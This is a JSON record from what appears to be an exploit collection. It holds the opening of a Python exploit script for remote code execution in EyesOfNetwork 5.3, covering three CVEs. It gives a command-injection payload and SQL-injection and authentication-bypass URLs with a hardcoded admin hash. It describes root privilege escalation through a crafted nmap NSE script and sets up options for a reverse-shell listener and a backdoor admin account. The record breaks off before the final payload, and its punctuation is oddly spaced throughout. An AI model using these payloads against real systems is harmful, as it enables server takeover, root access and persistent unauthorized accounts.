{
    "text": "vul_name : EyesOfNetwork 5.3 Remote Code Execution ， vul_cve : CVE-2020-8656 , CVE-2020-8654 , CVE-2020-8655 ， vul_poc :  # Exploit Title : EyesOfNetwork 5.3 - Remote Code Execution ，  # Date : 2020-02-01 ，  # Exploit Author : Clment Billac ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 5.3 ，  # CVE : CVE-2020-8654 , CVE-2020-8655 , CVE-2020-8656 ，  #  ! /bin/env python3 ，  # coding : utf8 ，  # CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands ，  # We were able to run the 'id' command with the following payload in the target field : ' ; id # '. ，  # CVE-2020-8655 - LPE via nmap NSE script ，  # As the apache user is allowed to run nmap as root , we were able to execute arbitrary commands by providing a specially crafted NSE script. ，  # nmap version 6.40 is used and doesn't have the -c and -e options. ，  # CVE-2020-8656 - SQLi in API in getApiKey function on 'username' field ，  # PoC : /eonapi/getApiKey?username=' union select sleep ( 3 )  , 0 , 0 , 0 , 0 , 0 , 0 , 0 or ' ，  # Auth bypass : /eonapi/getApiKey?&username=' union select 1 , 'admin' , '1c85d47ff80b5ff2a4dd577e8e5f8e9d' , 0 , 0 , 1 , 1 , 8 or '&password=h4knet ，  # Python imports ， from bs4 import BeautifulSoup ，  # Text colors ， txt_yellow = \"\\033 [ 01 ; 33m\" ， txt_blue = \"\\033 [ 01 ; 34m\" ， txt_red = \"\\033 [ 01 ; 31m\" ， txt_green = \"\\033 [ 01 ; 32m\" ， txt_bold = \"\\033 [ 01 ; 01m\" ， txt_reset = \"\\033 [ 00m\" ， txt_info = txt_blue + \" [  *  ] \" + txt_reset ， txt_success = txt_green + \" [ + ] \" + txt_reset ， txt_warn = txt_yellow + \" [  !  ] \" + txt_reset ， txt_err = txt_red + \" [ x ] \" + txt_reset ，  # Banner ， banner = ( txt_bold + \" ， +-+ ，  | EyesOfNetwork 5.3 RCE ( API v2.4.2 )  |  ，  | 02/2020 - Clment Billac \\033 [ 01 ; 34mTwitter :  @ h4knet\\033 [ 00m |  ，  | Examples :  |  ，  | eonrce.py -h |  ，  | eonrce.py http ( s )  : /EyesOfNetwork-URL |  ，  | eonrce.py -ip 10.11.0.182 -port 3128 |  ，  | eonrce.py -ip 10.11.0.182 -user pentest2020 |  ， +-+ ， \" + txt_reset )  ，  # Arguments Parser ， parser = argparse.ArgumentParser ( \"eonrce\" , formatter_class=argparse.RawDescriptionHelpFormatter , usage=banner )  ， parser.add_argument ( \"URL\" , metavar=\"URL\" , help=\"URL of the EyesOfNetwork server\" )  ， parser.add_argument ( \"-ip\" , metavar=\"IP\" , help=\"Local IP to receive reverse shell\" , default=socket.gethostbyname ( socket.gethostname (  )  ， parser.add_argument ( \"-port\" , metavar=\"Port\" , type=int , help=\"Local port to listen\" , default=443 )  ， parser.add_argument ( \"-user\" , metavar=\"Username\" , type=str , help=\"Name of the new user to create\" , default='h4ker' )  ， parser.add_argument ( \"-password\" , metavar=\"Password\" , type=str , help=\"Password of the new user\" , default='net_was_here' )  ， args = parser.parse_args (  )  ，  # HTTP Requests config ， requests.packages.urllib3.disable_warnings (  )  ， baseurl = sys.argv [ 1 ] .strip ( '/' )  ， url = baseurl ， useragent = 'Mozilla/5.0 ( Windows NT 1.0 ; WOW64 ; rv : 13.37 ) Gecko/20200104 Firefox/13.37' ，  # Admin user creation variables ， new_user = args.user ， new_pass = args.password ，  # Executed command ，  # The following payload performs both the LPE and the reverse shell in a single command. ，  # It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.",
    "time": "2020.02.08"
}